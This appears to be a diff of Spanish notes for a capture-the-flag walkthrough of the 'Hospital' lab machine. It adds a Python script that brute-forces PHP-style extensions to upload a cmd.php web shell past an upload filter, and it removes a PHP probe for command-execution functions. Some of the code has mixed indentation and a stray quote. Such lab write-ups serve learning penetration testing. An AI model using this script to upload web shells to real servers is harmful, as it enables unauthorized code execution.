@@ -1,6 +1,6 @@
 
 -----
-- TAG: #DOMINIOS #NETEXEC
+- TAG: #DOMINIOS #NETEXEC #PYTHON
 ----
 - Empezamos creando nuestra carpeta Hospital en nuestra terminal, creamos las tres carpetas que necesitaremos para guardar la información 
 ```
@@ -111,61 +111,45 @@ if __name__ == '__main__':
 >`if "failed" not in r.headers["Location"]:`
 >	    `print(colored(f"\n[+] Extensión {extension}: {r.headers['Location']}", 'green'))`
 - Podemos realizar la misma función que realizamos con **burpsuite** utilizando **python**, con esta ultima función nos enlista todas las rutas **succes.php**.
-
-- En la parte de scripts nos creamos el siguiente archivo **.py**
-```
-nvim fileUpload.py
-```
+- En este punto con el siguiente código en **python** nos permitiría ejecutar código **.php** en la url con probando con las rutas encontradas:
+  `http://hospital.htb:8080/uploads/cmd.phar`
 ```
 #!/usr/bin/env python3
 
 import requests
-import pdb
 import signal
-import sys 
+import sys
 import time
-
-from termcolor import colored 
+from termcolor import colored
 from pwn import *
 
 def def_handler(sig, frame):
- print(colored(f"\n\n[!] Saliendo..\n", 'red'))
- sys.exit(1)
+    print(colored(f"\n\n[!] Saliendo..\n", 'red'))
+    sys.exit(1)
 
 # Ctrl+C
 signal.signal(signal.SIGINT, def_handler)
 
-upload_url = "http://hospital.htb:upload.php"
-cookies = {'PHPSESSID' : '=gvsg96egu23t3hjdnlv1ssb6ve'}
+upload_url = "http://hospital.htb:8080/upload.php"
+cookies = {'PHPSESSID' : 'gvsg96egu23t3hjdnlv1ssb6ve'}
 burp = {'http': 'http://127.0.0.1:8080'}
+extensions = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]
 
 def fileUpload():
-
     f = open("cmd.php", "r")
     fileContent = f.read()
-
-    fileToUpload = {'image': (f"cmd.phar", fileContent.strip())}
-
-    r = requests.post(upload_url, cookies=cookies, files=fileToUpload, allow_redirects=False)
-
-
-	log.info("Archivo subido exitosamente")
-
+	
+	p1 = log.progress("Fuerza bruta")
+	p1.status("Iniciando proceso de fuerza bruta")
+	
+	time.sleep(2)
+	
+    for extension in extensions:
+	    p1.status(f"Probando con la extensión {extension}")
+        fileToUpload = {'image': (f"cmd{extension}", fileContent.strip())}
+        r= requests.post(upload_url, cookies=cookies, files=fileToUpload, allow_redirects=False)
+        if "failed" not in r.headers["Location"]:
+	        log.info(f"Extensión {extension}: {r.headers['Location']}")
 if __name__ == '__main__':
-
-	fileUpload()
-```
-
-
-- Luego un archivo .php llamado **cmd.php**
-```
-<?php 
-  $dangerous_functions = array("exec", "passthru", "system", "shell_exec", "popen", "proc_open", "pcntl_exec");
-
-  foreach ("$dangerous_functions as $f){
-    if (function_exists($f)){
-	  echo "\n^[+]" . $f . " - EXISTE";
-    }
-  }
-?>
+    fileUpload()
 ```
